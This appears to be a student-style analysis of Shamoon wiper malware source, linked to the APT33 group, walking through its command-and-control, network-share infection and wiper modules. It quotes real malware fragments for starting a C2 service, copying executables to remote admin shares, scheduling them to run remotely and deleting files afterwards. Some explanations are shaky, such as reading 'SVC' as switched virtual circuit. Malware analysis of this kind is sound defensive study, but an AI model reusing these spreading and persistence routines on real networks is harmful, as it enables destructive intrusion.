# SHAPESHIFT  
## The wiper malware used by APT33
> Code sampled from https://github.com/christian-roggia/open-shamoon and https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf

The code being analyzed is Shamoon, a close relative to SHAPESHIFT. Although Shamoon was never attributed to APT33, the similarity of the
SHAPESHIFT code and goals makes it seem likely that Shamoon was the work of APT33.

The code is publicly available on **christian-roggia** GitHub and portions of code available in the Kaspersky report linked available

## Analysis of Shamoon souce code

### C2.cpp [open-shamoon/open-malware/Modules/C2.cpp]
C2 stands for 'Command and control servers', which are used to enable communication between the infected computer and the attacker.

In the C2.cpp file are the three functions:
```
bool Shamoon::Modules::C2::GetC2Specific(WCHAR *lpszFileName, WCHAR *lpszFilePath)

bool Shamoon::Modules::C2::RunC2Service(const WCHAR *lpszCommand)

DWORD Shamoon::Modules::C2::ContactC2Server(LPVOID /*lpThreadParameter*/)
```

The first function attempts to navigate to the command and control server path using the provided filename.
```
M_STRING02(lpszFileName,
		
		C2_MODULE_NAME,
		L".exe"
	)
	
	// Get C&C absolute path
	M_STRING03(lpszFilePath,
		
		g_szWinDir,
		L"\\system32\\",
		lpszFileName
	)
  ```
  If the module that it navigates to already exists, it deletes the current file so that the new module can be made
  ```
  EXECUTE_WOW64_FILE_OPERATION(
		DeleteFileW(lpszFilePath);
	)
  ```
  In the second function, the goal is to run the C2 service. If the service is already running, true is returned.
  ```
  // ID already found, service running
  if(g_dwC2_ID)
		return true;
	```
  If not, the code attempts to run the service
  ```
  if(!StartServiceProcess(g_dwC2_Name, szSvcPath, &g_dwC2_ID))
		return false;
	```
  returning false if the service cannot be ran and true otherwise.
  
  In the last function, the goal is contacting the C2 server which will then allow the attacker to have full control and communication with the infected target.
  
  The code loops until the C2 service has been started, waiting for a few minutes in between calls to start the service
  ```
  // Thread sleep for 2~3 minutes
	SvcSleep(Shamoon::Utils::GetRandom() % 60 + 120);
	
	// The routine loops until the service has been sucessfully started
	while(!bSvcStopped)
	{
		// Macro to enter and leave critical section
		SYSTEM_CRITICAL_SECTION(
			// Try to run the C&C service
			RunC2Service(L"1");
		)
		
		// Thread sleep for 2~3 minutes
		SvcSleep(Shamoon::Utils::GetRandom() % 60 + 120);
	}
	
	return 0;
```

## 64bit.cpp & 32bit.cpp
These two files allow for the retrieval of information specific to both 32 bit and 64 bit machines, thus allowing for a greater scope of attack. The 32bit.cpp file is much more involved than the 64bit file, with the functions
```
bool Shamoon::Modules::_32bit::Start32bitService(LPCWSTR lpMachineName, const WCHAR *a2)

bool Shamoon::Modules::_32bit::Get32bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)

bool Shamoon::Modules::_32bit::Save32bitModule()

bool Shamoon::Modules::_32bit::Setup32bitService()
```

Whereas 64bit has only 
```
bool Shamoon::Modules::_64bit::Get64bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
```


## Handler.cpp


## Infection.cpp

The bread and butter of the code; as the name would have it, Infection.cpp is responsible for the spreading of the malware that resulted
in tens of thousands of computers in the Middle East to be infected. Such another large scale attack is what is feared by many as Iranian hackers begin to lay the groundwork for another attack (as seen in the rise of phishing attacks)

The functions in this module:
```
bool WriteModuleOnSharedPC(LPCWSTR a1, LPCWSTR a2)

bool WriteModuleOnSharedNetwork()

bool WriteModuleOnSharedPCByArgv()
```

The first function is responsible for the infection of the current PC. The first step is acquiring the remote prefix (of the form "\\x.x.x.x\" 
```
M_STRING03
	(
		szRemotePrefix,

		L"\\\\",
		szRemoteAddr,
		L"\\"
	)
```
which is then used by string concatenation techniques to acquire a full pathname that will then allow for command execution. The format of the desired string is mentioned in comments.
```
while(1)
	{
		// Final format will be something like: "\\x.x.x.x\C$\\WINDOWS\\system32\\csrss.exe"
		memmove(&szSvcCSRSS[nPrefLen], pPart, strlenW(pPart) * sizeof(WCHAR));
		memmove(&szSvcCSRSS[nPrefLen + strlenW(pPart)], L"\\system32\\csrss.exe", strlenW(L"\\system32\\csrss.exe") * 
			sizeof(WCHAR));
		szSvcCSRSS[nPrefLen + strlenW(pPart) + strlenW(L"\\system32\\csrss.exe")] = 0;

		if(IsFileAccessible(szSvcCSRSS))
			break;
```
where the memmove function "is used to copy a block of memory from a location to another" (https://www.geeksforgeeks.org/memmove-in-cc/).
> void *memmove(void *str1, const void *str2, size_t n)

After the proper file path has been obtained, the code proceeds to apparently copy the malicious files and 'add a new job'.
The first part of the code searches for a random SVC (switched virtual circuit) that would allow for a connection that lasts long enough for data transfer
```
v17 = g_random_svc_name[GetRandom() % 29]
```
After, strcpyW is employed
> PWSTR StrCpyW(PWSTR  psz1, PCWSTR psz2)
where psz1 receives a copy of psz2. The functions used are probably wrappers, explaining the third paramter, which is the
size of the string (https://stackoverflow.com/questions/34889219/strcpy-with-3-parameters-reference-shows-only-2)

```
strcpyW(v46, v17, 2 * strlenW(v17));
strcpyW(&v46[strlenW(v17)], L".exe", 2 * strlenW(L".exe") + 2);
strcpyW(&szRemotePrefix[v33], v46, 2 * strlenW(v46) + 2);
```
The first parameters appear to be pointers in the remote system (target), while the second parameters (the thing being copied into paramter 1) are the infectious files, as indicated by the ".exe" extension in the second strcpy.

More strcpyWs are employed, with the intention to copy straight into the root directory:
```
strcpyW(v40, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
strcpyW(&v40[strlenW(L"%SystemRoot%\\System32\\")], v46, 2 * strlenW(v46) + 2);
```
The next lines appear to set up the execution of the malicious code on the remote system as seen by 'AddNewJob' on what appears
to be a remote address
```	
if(AddNewJob(szRemoteAddr, v40))
	return true;
	
AddNewJob(szRemoteAddr, v46);
```
The next few strcpyWs appear to copy an executable "trksvr.exe" onto the remote system, and then a file is deleted (?)
An explanation for this may be to cover tracks and have the malware remove itself after infecting the target.
```
strcpyW(NewFileName, v42, 2 * strlenW(v42));
strcpyW(&NewFileName[strlenW(v42)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 2);
strcpyW(v39, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
DeleteFileW(NewFileName);
```
## Wiper.cpp

The wiper file contains the functions
```
void Shamoon::Modules::Wiper::DeleteWiperModules()

bool Shamoon::Modules::Wiper::GetWiperSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
```
